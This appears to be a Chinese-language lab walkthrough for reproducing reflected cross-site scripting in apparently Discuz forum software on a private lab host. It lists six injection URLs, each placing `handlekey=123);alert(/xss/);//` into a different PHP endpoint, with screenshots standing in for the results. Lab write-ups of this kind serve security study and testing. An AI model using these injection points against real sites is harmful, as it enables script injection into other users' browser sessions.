
# 实战
在浏览器输入
```
http://IP:PORT/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)


![image]({path}/3.png)

![image]({path}/4.png)


## 攻击实战

在浏览器输入
```
192.168.1.170:7777/admincp.php?infloat=yes&handlekey=123);alert(/xss/);//
```

![image]({path}/5.png)


在浏览器输入

```
192.168.1.170:7777/ajax.php?infloat=yes&handlekey=123);alert(/xss/);//
```

![image]({path}/6.png)


在浏览器输入

```
192.168.1.170:7777/announcement.php?infloat=yes&handlekey=123);alert(/xss/);//
```

![image]({path}/7.png)

在浏览器输入

```
192.168.1.170:7777/attachment.php?infloat=yes&handlekey=123);alert(/xss/);//
```

![image]({path}/8.png)

在浏览器输入

```
192.168.1.170:7777/member.php?infloat=yes&handlekey=123);alert(/xss/);//
```

![image]({path}/9.png)

在浏览器输入

```
192.168.1.170:7777/post.php?action=reply&fid=17&tid=1591&extra=&replysubmit=yes&infloat=yes&handlekey=123);alert(/xss/);//
```

![image]({path}/10.png)